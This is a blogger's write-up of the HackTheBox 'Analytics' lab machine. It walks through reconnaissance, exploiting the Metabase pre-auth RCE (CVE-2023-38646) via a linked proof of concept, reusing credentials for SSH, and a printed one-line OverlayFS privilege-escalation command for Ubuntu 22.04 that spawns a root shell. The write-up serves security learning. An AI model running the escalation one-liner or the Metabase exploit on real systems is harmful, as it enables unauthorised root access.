# HackTheBox Analytics


![Open Lightbox](../assets/analytics1.webp){ .glightbox .center width="550" }

I started the machine got the IP and did a Nmap scan, port 22(ssh) and port 80(http) were open

```bash
❯ sudo nmap -Pn -sT -sV 10.10.11.233  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 13:45 IST  
Nmap scan report for 10.10.11.233  
```

So I opened Firefox and put in the IP and got (analytical.htb)  
I added it to /etc/hosts

![Open Lightbox](../assets/analytics2.webp){ .glightbox .center width="500" }

So I opened Firefox and put in the IP and got (analytical.htb)

![Open Lightbox](../assets/analytics3.webp){ .glightbox .center width="500" }

Looked into the source page and found another link [<http://data.analytical.htb>] again added it to /etc/hosts.

![Open Lightbox](../assets/analytics4.webp){ .glightbox .center width="500" }

Got a Metabase sign-in page I tried logging in with a few different usernames and passwords but it failed so I looked at Google for clues and found out that there is an RCE present in Metabase and found info about the CVE-2023–38646.   
Reference:-  
<https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/>

Now according to the POC, we have to retrieve the endpoint token so we have an endpoint
data.analytical.htb let’s capture the request in the burp suite.

![Open Lightbox](../assets/analytics5.webp){ .glightbox .center width="500" }

Found the set-up token now I have to look for an exploit honestly I tried 2–3 Exploits including Metasploit which also has the exploit for Metabase so finally found one that works for me.

<https://github.com/m3m0o/metabase-pre-auth-rce-poc>

And got a shell.

![Open Lightbox](../assets/analytics6.webp){ .glightbox .center width="500" }

Now as I searched around in the machine I found there is already a linpeas script in the /home/Metabase folder, so at the time I was playing the CTF there were 181 more people that were also playing with me someone must have put it there and made it easy for me too lol……  
I used the script and found the password for a user metanalytics and i used to ssh into the machine.

![Open Lightbox](../assets/analytics7.webp){ .glightbox .center width="500" }

I got the user flag but now I had to escalate the privilege to get the root flag. did the most basic thing check the OS version and if there are any vulnerabilities related to it got to know that it was running ubuntu 22.04.

![Open Lightbox](../assets/analytics8.webp){ .glightbox .center width="500" }

So did the Google dorking for the os version if any thing is there and obviously found a few 2 CVE and few more things.
Also found this code to escalate privilege.

```bash
unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap\_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")' 
```

And boom we got the root shell.


![Open Lightbox](../assets/analytics9.webp){ .glightbox .center width="500" }

Thank you for reading


